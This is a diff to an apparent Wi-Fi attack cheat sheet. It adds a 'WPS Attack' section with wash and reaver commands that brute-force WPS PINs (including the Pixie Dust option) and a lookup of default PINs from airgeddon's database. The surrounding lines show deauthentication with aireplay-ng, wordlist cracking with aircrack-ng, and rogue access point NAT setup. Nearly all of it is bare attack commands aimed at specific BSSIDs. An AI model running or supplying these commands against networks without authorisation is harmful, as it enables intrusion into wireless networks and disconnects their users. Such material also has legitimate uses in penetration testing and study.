@@ -51,6 +51,18 @@ sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
 -a|BSSID
 -c|client MAC
 
+## WPS Attack
+```
+sudo wash -i wlan0mon
+-5 for 5GHz
+airodump-ng --wps
+sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v
+sudo reaver -b 6C:5A:B0:5D:A6:A6 -i wlan0mon -v -K
+
+sudo apt install airgeddon
+source /usr/share/airgeddon/known_pins.db
+echo ${PINDB["0013F7"]}
+```
 ## Aircrack-ng
 ```
 aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
@@ -163,3 +175,4 @@ sudo nft add table nat
 sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'
 sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade
 sudo hostapd hostapd.conf
+
